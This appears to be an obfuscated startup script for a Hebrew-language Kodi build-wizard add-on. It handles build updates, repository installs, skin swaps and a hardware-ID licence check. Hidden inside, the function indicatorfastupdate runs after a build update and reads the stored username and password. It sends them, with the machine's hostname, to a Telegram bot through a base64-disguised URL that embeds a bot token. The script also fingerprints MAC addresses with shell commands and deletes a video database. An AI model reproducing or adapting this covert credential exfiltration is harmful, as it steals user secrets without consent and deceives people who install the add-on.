# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob #line:21
import shutil #line:22
import urllib2 ,urllib #line:23
import re #line:24
import uservar #line:25
import time #line:26
import json #line:27
import speedtest #line:28
from shutil import copyfile #line:29
from datetime import date ,datetime ,timedelta #line:30
from resources .libs import extract ,downloader ,downloaderbg ,downloaderwiz ,notify ,loginit ,debridit ,traktit ,maintenance ,skinSwitch ,uploadLog ,wizard as wiz #line:31
ADDON_ID =uservar .ADDON_ID #line:33
ADDONTITLE =uservar .ADDONTITLE #line:34
ADDON =wiz .addonId (ADDON_ID )#line:35
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:36
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:37
ADDONID =wiz .addonInfo (ADDON_ID ,'id')#line:38
DIALOG =xbmcgui .Dialog ()#line:39
DP =xbmcgui .DialogProgress ()#line:40
DP2 =xbmcgui .DialogProgressBG ()#line:41
HOME =xbmc .translatePath ('special://home/')#line:42
PROFILE =xbmc .translatePath ('special://profile/')#line:43
KODIHOME =xbmc .translatePath ('special://xbmc/')#line:44
ADDONS =os .path .join (HOME ,'addons')#line:45
KODIADDONS =os .path .join (KODIHOME ,'addons')#line:46
USERDATA =os .path .join (HOME ,'userdata')#line:47
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:48
PACKAGES =os .path .join (ADDONS ,'packages')#line:49
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:50
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:51
ICON =os .path .join (ADDONPATH ,'icon.png')#line:52
ART =os .path .join (ADDONPATH ,'resources','art')#line:53
SKIN =xbmc .getSkinDir ()#line:54
BUILDNAME =wiz .getS ('buildname')#line:55
DEFAULTSKIN =wiz .getS ('defaultskin')#line:56
DEFAULTNAME =wiz .getS ('defaultskinname')#line:57
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:58
BUILDVERSION =wiz .getS ('buildversion')#line:59
BUILDLATEST =wiz .getS ('latestversion')#line:60
BUILDCHECK =wiz .getS ('lastbuildcheck')#line:61
DISABLEUPDATE =wiz .getS ('disableupdate')#line:62
AUTOCLEANUP =wiz .getS ('autoclean')#line:63
AUTOCACHE =wiz .getS ('clearcache')#line:64
AUTOPACKAGES =wiz .getS ('clearpackages')#line:65
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:66
AUTOFEQ =wiz .getS ('autocleanfeq')#line:67
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:68
TRAKTSAVE =wiz .getS ('traktlastsave')#line:69
REALSAVE =wiz .getS ('debridlastsave')#line:70
LOGINSAVE =wiz .getS ('loginlastsave')#line:71
INSTALLMETHOD =wiz .getS ('installmethod')#line:72
KEEPTRAKT =wiz .getS ('keeptrakt')#line:73
KEEPREAL =wiz .getS ('keepdebrid')#line:74
KEEPLOGIN =wiz .getS ('keeplogin')#line:75
INSTALLED =wiz .getS ('installed')#line:76
EXTRACT =wiz .getS ('extract')#line:77
EXTERROR =wiz .getS ('errors')#line:78
NOTIFY =wiz .getS ('notify')#line:79
NOTEDISMISS =wiz .getS ('notedismiss')#line:80
NOTEID =wiz .getS ('noteid')#line:81
NOTIFY2 =wiz .getS ('notify2')#line:82
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:83
NOTEID2 =wiz .getS ('noteid2')#line:84
NOTIFY3 =wiz .getS ('notify3')#line:85
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:86
NOTEID3 =wiz .getS ('noteid3')#line:87
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else HOME #line:88
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:89
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:90
NOTEID2 =0 if NOTEID2 ==""else int (NOTEID2 )#line:91
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:92
AUTOFEQ =int (AUTOFEQ )if AUTOFEQ .isdigit ()else 1 #line:93
TODAY =date .today ()#line:94
TOMORROW =TODAY +timedelta (days =1 )#line:95
TWODAYS =TODAY +timedelta (days =2 )#line:96
THREEDAYS =TODAY +timedelta (days =3 )#line:97
ONEWEEK =TODAY +timedelta (days =7 )#line:98
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:99
EXCLUDES =uservar .EXCLUDES #line:100
SPEEDFILE =speedtest .SPEEDFILE #line:101
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:102
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:103
NOTIFICATION =uservar .NOTIFICATION #line:104
NOTIFICATION2 =uservar .NOTIFICATION2 #line:105
NOTIFICATION3 =uservar .NOTIFICATION3 #line:106
ENABLE =uservar .ENABLE #line:107
UNAME =speedtest .UNAME #line:108
HEADERMESSAGE =uservar .HEADERMESSAGE #line:109
AUTOUPDATE =uservar .AUTOUPDATE #line:110
WIZARDFILE =uservar .WIZARDFILE #line:111
AUTOINSTALL =uservar .AUTOINSTALL #line:112
REPOID =uservar .REPOID #line:113
REPOADDONXML =uservar .REPOADDONXML #line:114
REPOZIPURL =uservar .REPOZIPURL #line:115
REPOID18 =uservar .REPOID18 #line:116
REPOADDONXML18 =uservar .REPOADDONXML18 #line:117
REPOZIPURL18 =uservar .REPOZIPURL18 #line:118
COLOR1 =uservar .COLOR1 #line:119
COLOR2 =uservar .COLOR2 #line:120
TMDB_NEW_API =uservar .TMDB_NEW_API #line:121
WORKING =True if wiz .workingURL (SPEEDFILE )==True else False #line:122
FAILED =False #line:123
xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:124
AddonID ='plugin.program.Anonymous'#line:126
packagesdir =xbmc .translatePath (os .path .join ('special://home/addons/packages',''))#line:127
thumbnails =xbmc .translatePath ('special://home/userdata/Thumbnails')#line:128
dialog =xbmcgui .Dialog ()#line:129
setting =xbmcaddon .Addon ().getSetting #line:130
iconpath =xbmc .translatePath (os .path .join ('special://home/addons/'+AddonID ,'icon.png'))#line:131
notify_mode =setting ('notify_mode')#line:132
auto_clean =setting ('startup.cache')#line:133
filesize_thumb =int (setting ('filesizethumb_alert'))#line:135
total_size2 =0 #line:138
total_size =0 #line:139
count =0 #line:140
def disply_hwr ():#line:142
   O0O00000O00OO0000 =tmdb_list (TMDB_NEW_API )#line:143
   O0000000OOO00OO0O =str ((getHwAddr ('eth0'))*O0O00000O00OO0000 )#line:144
   OOOO0OOOOO0O0OO00 =(O0000000OOO00OO0O [1 ]+O0000000OOO00OO0O [2 ]+O0000000OOO00OO0O [5 ]+O0000000OOO00OO0O [7 ])#line:151
   OO00OOO0O0OO00O00 =(ADDON .getSetting ("action"))#line:152
   wiz .setS ('action',str (OOOO0OOOOO0O0OO00 ))#line:154
def getHwAddr (OOO00OO0O0O000000 ):#line:155
   import subprocess ,time #line:156
   OO0000OOOO00000OO ='windows'#line:157
   if xbmc .getCondVisibility ('system.platform.android'):#line:158
       OO0000OOOO00000OO ='android'#line:159
   if xbmc .getCondVisibility ('system.platform.android'):#line:160
     OOOOOO0OO00O0000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:161
     OO0OO0O000O0O00O0 =re .compile ('link/ether (.+?) brd').findall (str (OOOOOO0OO00O0000O ))#line:163
     O00OO0O00000OO00O =0 #line:164
     for O000000O00O0O00O0 in OO0OO0O000O0O00O0 :#line:165
      if OO0OO0O000O0O00O0 !='00:00:00:00:00:00':#line:166
          O0O00O000O0O000O0 =O000000O00O0O00O0 #line:167
          O00OO0O00000OO00O =O00OO0O00000OO00O +int (O0O00O000O0O000O0 .replace (':',''),16 )#line:168
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:170
       OOOO00000O0OO00O0 =0 #line:171
       O00OO0O00000OO00O =0 #line:172
       OOOOO00O0O0OOOOO0 =[]#line:173
       O0OOOOO0OOO00O00O =os .popen ("getmac").read ()#line:174
       O0OOOOO0OOO00O00O =O0OOOOO0OOO00O00O .split ("\n")#line:175
       for OO0000OOO00OO0O00 in O0OOOOO0OOO00O00O :#line:177
            OO00O000OO0OOO00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0000OOO00OO0O00 ,re .I )#line:178
            if OO00O000OO0OOO00O :#line:179
                OO0OO0O000O0O00O0 =OO00O000OO0OOO00O .group ().replace ('-',':')#line:180
                OOOOO00O0O0OOOOO0 .append (OO0OO0O000O0O00O0 )#line:181
                O00OO0O00000OO00O =O00OO0O00000OO00O +int (OO0OO0O000O0O00O0 .replace (':',''),16 )#line:184
   else :#line:186
       OOOO00000O0OO00O0 =0 #line:187
       O00OO0O00000OO00O =0 #line:188
       while (1 ):#line:189
         O0O00O000O0O000O0 =xbmc .getInfoLabel ("network.macaddress")#line:190
         logging .warning (O0O00O000O0O000O0 )#line:191
         if O0O00O000O0O000O0 !="Busy"and O0O00O000O0O000O0 !=' עסוק':#line:192
            break #line:194
         else :#line:195
           OOOO00000O0OO00O0 =OOOO00000O0OO00O0 +1 #line:196
           time .sleep (1 )#line:197
           if OOOO00000O0OO00O0 >30 :#line:198
            break #line:199
       O00OO0O00000OO00O =O00OO0O00000OO00O +int (O0O00O000O0O000O0 .replace (':',''),16 )#line:200
   return O00OO0O00000OO00O #line:202
def decode (OO0OO0O000000000O ,O0OO00000OOO00OO0 ):#line:203
    import base64 #line:204
    OOO0OO0OO000O0OO0 =[]#line:205
    if (len (OO0OO0O000000000O ))!=4 :#line:207
     return 10 #line:208
    O0OO00000OOO00OO0 =base64 .urlsafe_b64decode (O0OO00000OOO00OO0 )#line:209
    for OO0O0O0O0OO000OO0 in range (len (O0OO00000OOO00OO0 )):#line:211
        OO0OO00OO0OO00O0O =OO0OO0O000000000O [OO0O0O0O0OO000OO0 %len (OO0OO0O000000000O )]#line:212
        OOO0O0O0OOOOO000O =chr ((256 +ord (O0OO00000OOO00OO0 [OO0O0O0O0OO000OO0 ])-ord (OO0OO00OO0OO00O0O ))%256 )#line:213
        OOO0OO0OO000O0OO0 .append (OOO0O0O0OOOOO000O )#line:214
    return "".join (OOO0OO0OO000O0OO0 )#line:215
def tmdb_list (OOOOO0O0000O0O0OO ):#line:216
    OOO0OO000OO0OOO00 =decode ("7643",OOOOO0O0000O0O0OO )#line:219
    return int (OOO0OO000OO0OOO00 )#line:222
def u_list (O0OO00O00000000O0 ):#line:223
    from math import sqrt #line:225
    OOO00O00OO0O00OOO =tmdb_list (TMDB_NEW_API )#line:226
    O00OOOOO0OO00OOOO =str ((getHwAddr ('eth0'))*OOO00O00OO0O00OOO )#line:228
    OO000OO0OO000OO0O =int (O00OOOOO0OO00OOOO [1 ]+O00OOOOO0OO00OOOO [2 ]+O00OOOOO0OO00OOOO [5 ]+O00OOOOO0OO00OOOO [7 ])#line:229
    O0O0OO0O00O0O00OO =(ADDON .getSetting ("pass"))#line:231
    O000000O0O0O000OO =(str (round (sqrt ((OO000OO0OO000OO0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:236
    if '.'in O000000O0O0O000OO :#line:237
     O000000O0O0O000OO =(str (round (sqrt ((OO000OO0OO000OO0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:238
    if O0O0OO0O00O0O00OO ==O000000O0O0O000OO :#line:239
      O0OO0OO0OOOO0OOO0 =O0OO00O00000000O0 #line:241
    else :#line:243
       if STARTP ()and STARTP2 ()=='ok':#line:244
         return O0OO00O00000000O0 #line:246
       O0OO0OO0OOOO0OOO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:247
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:248
       sys .exit ()#line:249
    return O0OO0OO0OOOO0OOO0 #line:250
try :#line:251
   disply_hwr ()#line:252
except :#line:253
   pass #line:254
def indicatorfastupdate ():#line:256
       try :#line:257
          import json #line:258
          wiz .log ('FRESH MESSAGE')#line:259
          O0O00OOOOO00O00O0 =(ADDON .getSetting ("user"))#line:260
          O000OOO000000OOO0 =(ADDON .getSetting ("pass"))#line:261
          O00OO0OOOOOO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:263
          OO00OO0OO0OO00O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:264
          O00O0OOOO0OOOOOO0 =O0O00OOOOO00O00O0 #line:266
          O00O0O00000000O00 =O000OOO000000OOO0 #line:267
          import socket #line:268
          OO00OO0OO0OO00O00 =urllib2 .urlopen (O00OO0OOOOOO00OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00O0OOOO0OOOOOO0 +' - '+O00O0O00000000O00 ).readlines ()#line:269
       except :pass #line:271
def checkidupdate ():#line:272
				wiz .setS ("notedismiss","true")#line:274
				OOO00000OO000O00O =wiz .workingURL (NOTIFICATION )#line:275
				OO0OO000OO0000OOO =" Kodi Premium"#line:277
				O0OOO000O0OOO0O0O =wiz .checkBuild (OO0OO000OO0000OOO ,'gui')#line:278
				O00O0OOO00O000O00 =OO0OO000OO0000OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:279
				if not wiz .workingURL (O0OOO000O0OOO0O0O )==True :return #line:280
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:281
				OO00OO0OOO000O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OOO00O000O00 )#line:284
				try :os .remove (OO00OO0OOO000O0OO )#line:285
				except :pass #line:286
				if 'google'in O0OOO000O0OOO0O0O :#line:288
				   O000OOOOO0O0OOO00 =googledrive_download (O0OOO000O0OOO0O0O ,OO00OO0OOO000O0OO ,DP2 ,wiz .checkBuild (OO0OO000OO0000OOO ,'filesize'))#line:289
				else :#line:292
				  downloaderbg .download3 (O0OOO000O0OOO0O0O ,OO00OO0OOO000O0OO ,DP2 )#line:293
				xbmc .sleep (100 )#line:294
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:295
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:297
				extract .all (OO00OO0OOO000O0OO ,HOME )#line:299
				DP2 .close ()#line:300
				wiz .defaultSkin ()#line:301
				wiz .lookandFeelData ('save')#line:302
				wiz .kodi17Fix ()#line:303
				xbmc .executebuiltin ("ReloadSkin()")#line:304
				indicatorfastupdate ()#line:305
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:306
				debridit .debridIt ('restore','all')#line:307
				traktit .traktIt ('restore','all')#line:308
				if INSTALLMETHOD ==1 :OOOOO0OO00OO0OO0O =1 #line:309
				elif INSTALLMETHOD ==2 :OOOOO0OO00OO0OO0O =0 #line:310
				else :DP2 .close ()#line:311
def checkUpdate ():#line:317
	O00OO0O0O00OO0O00 =wiz .getS ('buildname')#line:318
	O0O0O00OO0OO00000 =wiz .getS ('buildversion')#line:319
	O0OOOOO00OO0O0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:320
	OOOO000OOOO00O000 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O00OO0O0O00OO0O00 ).findall (O0OOOOO00OO0O0O00 )#line:321
	if len (OOOO000OOOO00O000 )>0 :#line:322
		OOO00OOO00O0OOO00 =OOOO000OOOO00O000 [0 ][0 ]#line:323
		O0000OO0O00000OOO =OOOO000OOOO00O000 [0 ][1 ]#line:324
		O00O00O00O0OO0000 =OOOO000OOOO00O000 [0 ][2 ]#line:325
		wiz .setS ('latestversion',OOO00OOO00O0OOO00 )#line:326
		if OOO00OOO00O0OOO00 >O0O0O00OO0OO00000 :#line:327
			if DISABLEUPDATE =='false':#line:328
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0O0O00OO0OO00000 ,OOO00OOO00O0OOO00 ),xbmc .LOGNOTICE )#line:329
				notify .updateWindow (O00OO0O0O00OO0O00 ,O0O0O00OO0OO00000 ,OOO00OOO00O0OOO00 ,O0000OO0O00000OOO ,O00O00O00O0OO0000 )#line:330
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0O0O00OO0OO00000 ,OOO00OOO00O0OOO00 ),xbmc .LOGNOTICE )#line:331
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0O0O00OO0OO00000 ,OOO00OOO00O0OOO00 ),xbmc .LOGNOTICE )#line:332
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:333
wiz .log ("[Auto Update Wizard] Started",xbmc .LOGNOTICE )#line:368
if AUTOUPDATE =='Yes':#line:369
	input =(ADDON .getSetting ("autoupdate"))#line:370
	xbmc .executebuiltin ("UpdateLocalAddons")#line:371
	xbmc .executebuiltin ("UpdateAddonRepos")#line:372
	wiz .wizardUpdate ('startup')#line:373
	checkUpdate ()#line:375
else :wiz .log ("[Auto Update Wizard] Not Enabled",xbmc .LOGNOTICE )#line:377
wiz .log ("[Auto Install Repo] Started",xbmc .LOGNOTICE )#line:381
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=17 and KODIV <18 :#line:382
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','Please Wait....')))#line:383
	workingxml =wiz .workingURL (REPOADDONXML )#line:384
	if workingxml ==True :#line:385
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML ),'addon',ret ='version',attrs ={'id':REPOID })#line:386
		if len (ver )>0 :#line:387
			installzip ='%s-%s.zip'%(REPOID ,ver [0 ])#line:388
			workingrepo =wiz .workingURL (REPOZIPURL +installzip )#line:389
			if workingrepo ==True :#line:390
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:391
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:392
				lib =os .path .join (PACKAGES ,installzip )#line:393
				try :os .remove (lib )#line:394
				except :pass #line:395
				downloader .download (REPOZIPURL +installzip ,lib ,DP )#line:396
				extract .all (lib ,ADDONS ,DP )#line:397
				try :#line:398
					f =open (os .path .join (ADDONS ,REPOID ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:399
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID })#line:400
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID ,'icon.png'))#line:401
				except :#line:402
					pass #line:403
				if KODIV >=17 :wiz .addonDatabase (REPOID ,1 )#line:404
				DP .close ()#line:405
				xbmc .sleep (500 )#line:406
				wiz .forceUpdate (True )#line:407
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:408
				xbmc .executebuiltin ("ReloadSkin()")#line:409
				xbmc .executebuiltin ("ActivateWindow(home)")#line:410
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:411
				xbmc .Player ().play (f_play ,windowed =False )#line:412
			else :#line:414
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:415
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:416
		else :#line:417
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:418
	else :#line:419
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:420
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:421
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:422
elif os .path .exists (os .path .join (ADDONS ,REPOID )):wiz .log ("[Auto Install Repo] Repository already installed")#line:423
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=18 :#line:426
	workingxml =wiz .workingURL (REPOADDONXML18 )#line:427
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','Please Wait....')))#line:428
	if BUILDNAME =="":#line:429
		try :#line:430
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:431
		except :#line:432
				pass #line:433
	if workingxml ==True :#line:434
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML18 ),'addon',ret ='version',attrs ={'id':REPOID18 })#line:435
		if len (ver )>0 :#line:436
			installzip ='%s-%s.zip'%(REPOID18 ,ver [0 ])#line:437
			workingrepo =wiz .workingURL (REPOZIPURL18 +installzip )#line:438
			if workingrepo ==True :#line:439
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:440
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:441
				lib =os .path .join (PACKAGES ,installzip )#line:442
				try :os .remove (lib )#line:443
				except :pass #line:444
				downloader .download (REPOZIPURL18 +installzip ,lib ,DP )#line:445
				extract .all (lib ,ADDONS ,DP )#line:446
				try :#line:447
					f =open (os .path .join (ADDONS ,REPOID18 ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:448
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID18 })#line:449
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID18 ,'icon.png'))#line:450
				except :#line:451
					pass #line:452
				if KODIV >=17 :wiz .addonDatabase (REPOID18 ,1 )#line:453
				DP .close ()#line:454
				xbmc .sleep (500 )#line:455
				wiz .forceUpdate (True )#line:456
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:457
				xbmc .executebuiltin ("ReloadSkin()")#line:458
				xbmc .executebuiltin ("ActivateWindow(home)")#line:459
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:460
				xbmc .Player ().play (f_play ,windowed =False )#line:461
			else :#line:463
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:464
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:465
		else :#line:466
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:467
	else :#line:468
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:469
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:470
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:472
elif os .path .exists (os .path .join (ADDONS ,REPOID18 )):wiz .log ("[Auto Install Repo] Repository already installed")#line:473
def setuname ():#line:474
    O0OO0OOO0O000OOO0 =''#line:475
    O00O0O0000OOO0O0O =xbmc .Keyboard (O0OO0OOO0O000OOO0 ,'הכנס שם משתמש')#line:476
    O00O0O0000OOO0O0O .doModal ()#line:477
    if O00O0O0000OOO0O0O .isConfirmed ():#line:478
           O0OO0OOO0O000OOO0 =O00O0O0000OOO0O0O .getText ()#line:479
           wiz .setS ('user',str (O0OO0OOO0O000OOO0 ))#line:480
def STARTP2 ():#line:481
	if BUILDNAME ==" Kodi Premium":#line:482
		O00OOOO0O0OOOOOOO =(ADDON .getSetting ("user"))#line:483
		OO0000O0OOO0OOOOO =(UNAME )#line:484
		OOO0OOO0OO0O0000O =urllib2 .urlopen (OO0000O0OOO0OOOOO )#line:485
		OO0O0000OO000O00O =OOO0OOO0OO0O0000O .readlines ()#line:486
		if not O00OOOO0O0OOOOOOO +'\r\n'in OO0O0000OO000O00O :#line:487
			OO00O000OO00O0OO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]ברוכים הבאים לקודי אנונימוס"%(COLOR2 ),"נא להכניס את שם המשתמש שלכם[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:488
			if OO00O000OO00O0OO0 :#line:490
				ADDON .openSettings ()#line:491
				sys .exit ()#line:492
			else :#line:493
				sys .exit ()#line:494
		return 'ok'#line:498
def skinWIN ():#line:501
	idle ()#line:502
	O00O0000OOOO0000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:503
	OOO0OO0O000OOOOOO =[];O0OOOOO00OO00O000 =[]#line:504
	for OO00000O0OOO00OO0 in sorted (O00O0000OOOO0000O ,key =lambda O00OO000O000OO0O0 :O00OO000O000OO0O0 ):#line:505
		OOO000O0OO00O0O0O =os .path .split (OO00000O0OOO00OO0 [:-1 ])[1 ]#line:506
		O0O00O0O000OO000O =os .path .join (OO00000O0OOO00OO0 ,'addon.xml')#line:507
		if os .path .exists (O0O00O0O000OO000O ):#line:508
			O0O00O0O0O00O0O00 =open (O0O00O0O000OO000O )#line:509
			OO0OOO0O00O0O0OOO =O0O00O0O0O00O0O00 .read ()#line:510
			OO0OO00OO0OOO0OO0 =parseDOM2 (OO0OOO0O00O0O0OOO ,'addon',ret ='id')#line:511
			OOO0O0OO0O0O0000O =OOO000O0OO00O0O0O if len (OO0OO00OO0OOO0OO0 )==0 else OO0OO00OO0OOO0OO0 [0 ]#line:512
			try :#line:513
				O0OO0OOOO0OO000O0 =xbmcaddon .Addon (id =OOO0O0OO0O0O0000O )#line:514
				OOO0OO0O000OOOOOO .append (O0OO0OOOO0OO000O0 .getAddonInfo ('name'))#line:515
				O0OOOOO00OO00O000 .append (OOO0O0OO0O0O0000O )#line:516
			except :#line:517
				pass #line:518
	O0OOOO0O00OO0O0OO =[];OOOOOOOO0O00OO0O0 =0 #line:519
	OO0O000000OO000OO =["Current Skin -- %s"%currSkin ()]+OOO0OO0O000OOOOOO #line:520
	OOOOOOOO0O00OO0O0 =DIALOG .select ("Select the Skin you want to swap with.",OO0O000000OO000OO )#line:521
	if OOOOOOOO0O00OO0O0 ==-1 :return #line:522
	else :#line:523
		O0000O00OO0OOO0O0 =(OOOOOOOO0O00OO0O0 -1 )#line:524
		O0OOOO0O00OO0O0OO .append (O0000O00OO0OOO0O0 )#line:525
		OO0O000000OO000OO [OOOOOOOO0O00OO0O0 ]="%s"%(OOO0OO0O000OOOOOO [O0000O00OO0OOO0O0 ])#line:526
	if O0OOOO0O00OO0O0OO ==None :return #line:527
	for O000O00O0OOO0O0OO in O0OOOO0O00OO0O0OO :#line:528
		swapSkins (O0OOOOO00OO00O000 [O000O00O0OOO0O0OO ])#line:529
def currSkin ():#line:531
	return xbmc .getSkinDir ('Container.PluginName')#line:532
def fix17update ():#line:534
	if KODIV >=17 and KODIV <18 :#line:535
		wiz .kodi17Fix ()#line:536
		xbmc .sleep (4000 )#line:537
		try :#line:538
			OO0OO0000OOO0O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:539
			O00OOO000O0OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:540
			os .rename (OO0OO0000OOO0O000 ,O00OOO000O0OOO0O0 )#line:541
		except :#line:542
				pass #line:543
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:544
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:545
		fixfont ()#line:546
		OOOO00OOOO000O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:547
		try :#line:549
			O0O0O0000O0O0OO00 =open (OOOO00OOOO000O0OO ,'r')#line:550
			O0O000OO0OO00OOO0 =O0O0O0000O0O0OO00 .read ()#line:551
			O0O0O0000O0O0OO00 .close ()#line:552
			O0O00OO00OOO00O0O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:553
			OO0OOOO0OO0O0OO0O =re .compile (O0O00OO00OOO00O0O ).findall (O0O000OO0OO00OOO0 )[0 ]#line:554
			O0O0O0000O0O0OO00 =open (OOOO00OOOO000O0OO ,'w')#line:555
			O0O0O0000O0O0OO00 .write (O0O000OO0OO00OOO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO0OOOO0OO0O0OO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:556
			O0O0O0000O0O0OO00 .close ()#line:557
		except :#line:558
				pass #line:559
		wiz .kodi17Fix ()#line:560
